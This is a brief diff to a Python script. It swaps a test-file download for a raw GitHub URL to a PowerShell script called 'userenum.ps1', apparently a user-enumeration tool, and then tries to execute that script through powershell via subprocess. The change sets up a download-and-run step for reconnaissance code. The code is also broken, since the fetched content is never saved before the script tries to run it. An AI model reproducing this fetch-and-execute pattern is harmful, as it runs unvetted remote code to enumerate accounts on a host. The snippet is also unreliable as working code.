@@ -1,15 +1,16 @@
 import requests
 import os
 import time
+import subprocess, sys
 
-def run(self, cmd):
-    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
+def run(cmd):
+    completed = subprocess.run(["powershell", cmd], capture_output=True)
     return completed
 
-u = "http://download.thinkbroadband.com/10MB.zip"
+u = "https://raw.githubusercontent.com/deepakkeshav98/userenum/main/userenum.ps1"
 r = requests.get(u)
 
-op=run(userenum.ps1)
+op=run("userenum.ps1")
 print(op)
 
 time.sleep(5)
